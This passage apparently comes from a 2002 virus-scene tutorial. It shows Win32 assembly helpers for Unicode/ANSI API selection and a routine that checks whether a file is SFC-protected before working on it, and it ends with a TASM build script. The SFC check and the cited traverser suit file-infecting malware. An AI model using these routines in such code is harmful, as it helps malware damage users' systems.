shr     eax, 1fh                        ;eax = 0 if Unicode platform
                                        ;      1 if ANSI platform
lea     esi, dword ptr [eax * 4 + esp]  ;esi -> CharNextW if Unicode platform
                                        ;       CharNextA if ANSI platform
dec     eax
mov     al, 0ffh
movzx   edi, ax                         ;edi = ffff if Unicode platform
                                        ;      00ff if ANSI platform
call    dword ptr [esi + 8]             ;call platform-specific GetCommandLine
mov     ebx, dword ptr [eax]
and     ebx, edi                        ;mask Unicode or ANSI character
cmp     ebx, '"'                        ;Unicode-compatible compare
je      skip_argv0                      ;filename will end with '"'
push    ' '
pop     ebx                             ;filename will end with ' '
skip_argv0:
push    eax
call    dword ptr [esi]                 ;call platform-specific CharNext
mov     ecx, dword ptr [eax]
and     ecx, edi                        ;mask Unicode or ANSI character
je      no_args
cmp     ecx, ebx                        ;found end of filename?
jne     skip_argv0                      ;no, continue
find_argv1:
push    eax
call    dword ptr [esi]                 ;call platform-specific CharNext
mov     ecx, dword ptr [eax]
and     ecx, edi                        ;mask Unicode or ANSI character
cmp     ecx, ' '                        ;Unicode-compatible compare
je      find_argv1                      ;skip spaces until argument or end
jecxz   no_args
[work with arguments here]
no_args:


Example that calculates string length in bytes:

;esp -> lstrlenW, lstrlenA
;esi -> string
call    GetVersion
shr     eax, 1fh                        ;eax = 0 if Unicode platform
                                        ;      1 if ANSI platform
push    esi
call    dword ptr [eax * 4 + esp]       ;call platform-specific lstrlen
                                        ;lstrlenW if Unicode platform
                                        ;lstrlenA if ANSI platform
xchg    ebp, eax                        ;save character count
call    GetVersion
sar     eax, 1fh                        ;eax = 00000000 if Unicode platform
                                        ;      ffffffff if ANSI platform
inc     eax                             ;eax = 1 if Unicode platform
                                        ;      0 if ANSI platform
xchg    ecx, eax
shl     ebp, cl                         ;convert character count to byte count


Example that checks if file is protected by SFC:
SfcIsFileProtected takes a Unicode (not multibyte) full path (not filename)
so L"explorer.exe" is not protected, but L"c:\winnt\explorer.exe" is protected

;esp -> GetFullPathNameW, GetFullPathNameA
;esi -> filename to check
enter   MAX_PATH * 2, 0                 ;maximum size required for path
mov     ecx, esp
push    eax                             ;create space for filename variable
push    esp
push    ecx
push    MAX_PATH                        ;buffer size is characters, not bytes
push    esi
call    GetVersion
shr     eax, 1fh                        ;eax = 0 if Unicode platform
                                        ;      1 if ANSI platform
inc     eax                             ;allow for saved ebp on stack
call    dword ptr [eax * 4 + ebp]       ;call platform-specific GetFullPathName
                                        ;GetFullPathNameW if Unicode platform
                                        ;GetFullPathNameA if ANSI platform
xchg    edi, eax                        ;save character count
pop     eax                             ;discard filename
xor     ebx, ebx
call    GetVersion
test    eax, eax
jns     call_sfc                        ;branch if Unicode platform
mov     ecx, esp
xchg    ebp, eax                        ;save ebp (no push - enter alters esp)
enter   MAX_PATH * 2, 0                 ;maximum space required for path
xchg    ebp, eax                        ;restore ebp for single leave later
mov     eax, esp
push    MAX_PATH                        ;buffer size is characters, not bytes
push    eax
inc     edi                             ;include null terminator
push    edi
push    ecx
push    ebx                             ;use default translation
push    ebx                             ;CP_ANSI
call    MultiByteToWideChar             ;convert ANSI path to Unicode path
call_sfc:
mov     ecx, 'rgb!'                     ;replace by SfcIsFileProtected or 0
xor     eax, eax                        ;fake success in case of no SFC
jecxz   skip_sfc
push    esp
push    ebx
call    ecx
skip_sfc:
leave
test    eax, eax
jne     ignore_file                     ;non-zero if file is protected
[work with unprotected file]
ignore_file:


For  more  examples,  see my other sources, such as Shrug and  EfishNC,  which
contain directory traverser, and IP address to UNC path converter.


Greets to the old Defjam crew:

Prototype, RTFishel, Obleak, and The Gingerbread Man


rgb/dj feb 2002
iam_rgb@hotmail.com
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[UNICODE.TXT]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
%tasm32%\bin\tlink32 /c /B:400000 /Tpe /aa /x /n %1.obj,,,%tasm32%\lib\import32.lib,
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE EFISHNC
echo requires %tasm32% set to TASM directory (eg C:\TASM)

:end
echo.
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
